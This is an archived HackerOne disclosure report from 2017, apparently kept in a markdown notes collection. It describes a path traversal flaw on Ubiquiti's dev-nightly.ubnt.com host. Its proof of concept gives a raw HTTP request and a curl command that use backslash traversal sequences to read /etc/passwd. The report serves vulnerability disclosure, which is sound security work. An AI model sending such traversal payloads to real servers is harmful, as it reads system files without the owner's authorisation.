---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2017-09-14
submitted: 2017-08-15T16:51:21.285Z
bounty_usd: null
votes: 31
cve: []
program: "[[programs/ui|Ubiquiti Inc.]]"
reporter: "bobrov"
source: "https://hackerone.com/reports/260420"
title: "[dev-nightly.ubnt.com] Local File Reading"
---
# [dev-nightly.ubnt.com] Local File Reading

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 31 | **Program:** Ubiquiti Inc. | **Disclosed:** 2017-09-14

- Report: [https://hackerone.com/reports/260420](https://hackerone.com/reports/260420)
- CWE: Path Traversal
- Submitted: 2017-08-15T16:51:21.285Z

## Report summary

`¯\_(ツ)_/¯`

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Description**
Reading files outside the web root via path traversal

**PoC**
```http
GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
Host: dev-nightly.ubnt.com
```
```
curl "https://dev-nightly.ubnt.com/..\..\..\etc\passwd"
```

**Result**
{F213057}

## Timeline

- **Report Filed**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
